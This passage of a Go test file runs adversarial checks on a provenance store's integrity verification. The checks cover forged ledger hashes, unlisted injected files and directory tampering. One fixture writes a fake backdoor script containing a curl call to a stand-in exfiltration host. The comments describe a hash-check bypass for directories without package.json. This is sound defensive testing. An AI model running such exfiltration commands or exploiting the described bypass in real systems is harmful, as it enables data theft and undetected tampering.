	report, err := store.VerifyIntegrity(tempDir)
	if err != nil {
		t.Fatalf("VerifyIntegrity failed: %v", err)
	}

	if report.AllValid {
		t.Fatalf("[CRITICAL] VerifyIntegrity did not detect altered/forged SHA256 hash in ledger!")
	} else {
		t.Logf("[PASS] Forged SHA256 hash in ledger detected: AllValid=false, FailedCount=%d", report.FailedCount)
	}
}

// TestAdversary_Provenance_InjectedUnlistedFiles tests whether VerifyIntegrity
// detects unlisted/injected files in the workspace.
func TestAdversary_Provenance_InjectedUnlistedFiles(t *testing.T) {
	tempDir := t.TempDir()
	store, err := acquisition.NewProvenanceStore(tempDir)
	if err != nil {
		t.Fatalf("failed to create ProvenanceStore: %v", err)
	}

	// Record legitimate resource
	legitFile := filepath.Join(tempDir, "legit.txt")
	legitContent := []byte("legitimate resource")
	_ = os.WriteFile(legitFile, legitContent, 0644)
	h := sha256.Sum256(legitContent)

	_ = store.Record(acquisition.ProvenanceEntry{
		ResourceID:          "legit-res",
		AcquisitionMethod:   "npm",
		SourceURL:           "https://example.com/legit",
		VersionOrSHA:        "1.0",
		SHA256Hash:          hex.EncodeToString(h[:]),
		InstalledPath:       "legit.txt",
		JustificationTaskID: "task-legit",
	})

	// ADVERSARIAL INJECTION: Drop an unlisted malicious file into the workspace
	injectedFile := filepath.Join(tempDir, "unlisted_backdoor.sh")
	_ = os.WriteFile(injectedFile, []byte("#!/bin/sh\ncurl evil.com/exfil"), 0755)

	report, err := store.VerifyIntegrity(tempDir)
	if err != nil {
		t.Fatalf("VerifyIntegrity error: %v", err)
	}

	t.Logf("VerifyIntegrity result with unlisted file present: AllValid=%v, FailedCount=%d, Issues=%+v",
		report.AllValid, report.FailedCount, report.Issues)

	// EMPIRICAL CHALLENGE FINDING:
	// VerifyIntegrity only iterates over ledger entries; it never scans workspace for unlisted files!
	if report.AllValid {
		t.Logf("[EMPIRICAL FINDING: UNLISTED FILE BLINDSPOT] ProvenanceStore.VerifyIntegrity() does NOT detect injected unlisted files in workspace! (AllValid = true despite unlisted_backdoor.sh present)")
	} else {
		t.Logf("[PASS] Injected unlisted file was detected")
	}
}

// TestAdversary_Provenance_DirectoryTampering probes directory integrity checking.
func TestAdversary_Provenance_DirectoryTampering(t *testing.T) {
	tempDir := t.TempDir()
	store, err := acquisition.NewProvenanceStore(tempDir)
	if err != nil {
		t.Fatalf("failed to create ProvenanceStore: %v", err)
	}

	// Create a cloned directory with code files but NO package.json
	repoDir := filepath.Join(tempDir, "cloned_repo")
	_ = os.MkdirAll(repoDir, 0755)
	_ = os.WriteFile(filepath.Join(repoDir, "main.go"), []byte("package main\nfunc main(){}"), 0644)

	relRepo, _ := filepath.Rel(tempDir, repoDir)
	fakeRecordedHash := "abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890"

	_ = store.Record(acquisition.ProvenanceEntry{
		ResourceID:          "git-library",
		AcquisitionMethod:   "git",
		SourceURL:           "https://github.com/example/lib.git",
		VersionOrSHA:        "abcdef1",
		SHA256Hash:          fakeRecordedHash,
		InstalledPath:       relRepo,
		JustificationTaskID: "task-git-tamper",
	})

	// Tamper: modify main.go
	_ = os.WriteFile(filepath.Join(repoDir, "main.go"), []byte("package main\n// TAMPERED CODE"), 0644)

	report, err := store.VerifyIntegrity(tempDir)
	if err != nil {
		t.Fatalf("VerifyIntegrity error: %v", err)
	}

	t.Logf("Directory tamper report (no package.json): AllValid=%v, FailedCount=%d, Issues=%+v",
		report.AllValid, report.FailedCount, report.Issues)

	// EMPIRICAL CHALLENGE FINDING:
	// In provenance.go line 289, if package.json is missing, actualHash = entry.SHA256Hash!
	// So any modifications to directory files without package.json are completely ignored!
	if report.AllValid {
		t.Logf("[EMPIRICAL FINDING: DIRECTORY HASH BYPASS] When a directory does not contain package.json, VerifyIntegrity bypasses hash verification and sets actualHash = entry.SHA256Hash, masking any file tampering inside the directory!")
	} else {
		t.Logf("[PASS] Directory file tampering was detected")
	}
}
